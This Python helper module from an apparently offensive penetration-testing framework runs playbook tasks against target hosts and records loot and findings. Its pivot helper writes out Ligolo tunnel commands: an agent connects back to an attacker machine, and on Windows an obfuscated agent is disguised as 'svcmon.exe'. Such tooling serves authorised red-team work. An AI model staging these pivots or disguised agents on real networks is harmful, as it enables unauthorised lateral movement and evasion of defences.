"""Shared engagement-engine helpers used by both the CLI and the MCP server.

Keeping the task-execution logic here (rather than in `cli.py`) means the CLI
`run` command and the `yhwach_run` MCP tool render and execute a task through the
exact same code path — no drift between the two operator surfaces.
"""
from __future__ import annotations

import json as _json
from pathlib import Path

from yhwach import db as yhdb
from yhwach.actions import context_from_surface, get_action, render_action, run_action
from yhwach.interpret import interpret_all
from yhwach.playbooks import default_playbook_dir, load_rules
from yhwach.primitives import check_denylist, load_denylist, record_denylist_hit


def artifact_dir(db_path: Path | str, name: str) -> Path:
    """Locate an engagement artifact dir (recon/loot/...) relative to the DB.

    For the canonical layout (<lab>/state/yhwach.db) this is <lab>/<name>; for a
    flat DB path it is <db_dir>/<name>, so a bare /tmp/x.db never resolves to /.
    """
    p = Path(db_path)
    if p.parent.name == "state":
        return p.parent.parent / name
    return p.parent / name


def render_pivot(via_ip: str, subnet: str, os_name: str | None, lport: int = 11601) -> list[str]:
    """Render the commands to stand up a pivot from `via_ip` into `subnet`.

    Windows pivots use the pre-staged obfuscated agent (svcmon.exe); other hosts
    use a stock Ligolo agent. Kali-side proxy/route commands are included. This
    is proposal-tier — the operator runs it."""
    lines = [f"== Pivot via {via_ip} ({os_name or 'os?'}) -> {subnet} =="]
    if (os_name or "").lower().startswith("win"):
        action = get_action("deploy_ligolo_agent_win")
        lines += [f"  $ {c}" for c in render_action(action, {"IP": via_ip, "LPORT": str(lport)})]
    else:
        lines += [
            f"  # On the pivot ({via_ip}): drop + run a Ligolo agent",
            f"  $ ./agent -connect <KALI-IP>:{lport} -ignore-cert",
        ]
    lines += [
        "  # Kali side — start the proxy, add the tun, route the subnet:",
        f"  $ sudo ./proxy -selfcert -laddr 0.0.0.0:{lport}",
        f"  $ sudo ip route add {subnet} dev ligolo",
    ]
    return lines


def execute_task(
    db_path: Path | str,
    engagement_id: int,
    task_id: int,
    *,
    go: bool = False,
    hexstrike_url: str | None = None,
) -> tuple[list[str], bool]:
    """Render (and with `go`, execute read-only) a task's actions.

    Returns (output_lines, ok). ok is False when the task or its rule can't be
    resolved. With go=True, read-only/runnable actions execute (output captured
    to loot/), findings are extracted and persisted, and lore-denylist artifacts
    are recorded. Proposal/render-only actions are only rendered — never run.

    With `hexstrike_url`, read-only actions run through HexStrike (delegated
    execution) instead of a local subprocess; the extracted findings/tags are
    identical, so AD enum output flows straight into the parsers.
    """
    path = Path(db_path)
    rules = {r.id: r for r in load_rules(default_playbook_dir())}
    denylist = load_denylist(default_playbook_dir())

    hexstrike = None
    if hexstrike_url:
        from yhwach.hexstrike import HexStrikeClient
        hexstrike = HexStrikeClient(hexstrike_url)

    with yhdb.transaction(path) as conn:
        row = conn.execute(
            "SELECT t.playbook_rule_id AS rule_id, t.target_host_id AS host_id, "
            "t.target_surface_id AS surface_id, h.ip AS ip, s.meta_json AS meta, "
            "svc.port AS port, e.domain AS domain "
            "FROM task t JOIN host h ON h.id = t.target_host_id "
            "JOIN engagement e ON e.id = t.engagement_id "
            "LEFT JOIN surface s ON s.id = t.target_surface_id "
            "LEFT JOIN service svc ON svc.id = s.service_id "
            "WHERE t.id = ? AND t.engagement_id = ?",
            (task_id, engagement_id),
        ).fetchone()

    if row is None:
        return [f"[!] Task {task_id} not found in this engagement."], False
    rule = rules.get(row["rule_id"])
    if rule is None:
        return [f"[!] Rule '{row['rule_id']}' not found in playbooks."], False

    try:
        meta = _json.loads(row["meta"]) if row["meta"] else {}
    except (ValueError, TypeError):
        meta = {}
    ctx = context_from_surface(row["ip"], row["port"] or "PORT", meta)
    if row["domain"]:
        ctx["DOMAIN"] = row["domain"]
    loot_dir = artifact_dir(path, "loot")

    via = "  (via HexStrike)" if hexstrike else ""
    out = [f"== Task {task_id}: {row['rule_id']} @ {row['ip']} =={via}"]
    for emit in rule.emits:
        action = get_action(emit.get("action", ""))
        if action is None:
            out.append(f"[-] {emit.get('action', '?')}: no command mapped")
            continue
        can_run = action.risk == "read_only" and action.runnable
        for cmd in render_action(action, ctx):
            out.append(f"  $ {cmd}" + ("" if can_run else f"   [{action.risk}, render-only]"))
        if go and can_run:
            for res in run_action(action, ctx, loot_dir=loot_dir, hexstrike=hexstrike):
                head = "\n".join((res["output"] or "").splitlines()[:8])
                out.append(f"    -> rc={res['returncode']}  loot={res.get('loot_file', '-')}")
                if head.strip():
                    out.append("    | " + head.replace("\n", "\n    | "))
                for found in interpret_all(action.id, res.get("output", ""), ctx):
                    with yhdb.transaction(path) as c2:
                        _, created = yhdb.add_finding(
                            c2, row["host_id"], row["surface_id"], found.cls,
                            found.title, found.severity, found.evidence, row["rule_id"],
                            tag=found.tag,
                        )
                    tagnote = f" [tag:{found.tag}]" if found.tag else ""
                    out.append(
                        f"    [finding] {found.severity.upper()} {found.cls} "
                        f"{found.title}{tagnote} ({'new' if created else 'updated'})"
                    )
                artifact = check_denylist(res.get("output", ""), denylist)
                if artifact is not None:
                    with yhdb.transaction(path) as c3:
                        if record_denylist_hit(c3, engagement_id, row["host_id"], artifact):
                            out.append(f"    [denylist] '{artifact}' — host tagged "
                                       "dev_artifact, will be filtered from ranking")
        elif go and not can_run:
            out.append(f"    (skipped --go: {action.risk}/render-only — operator runs this)")

    return out, True
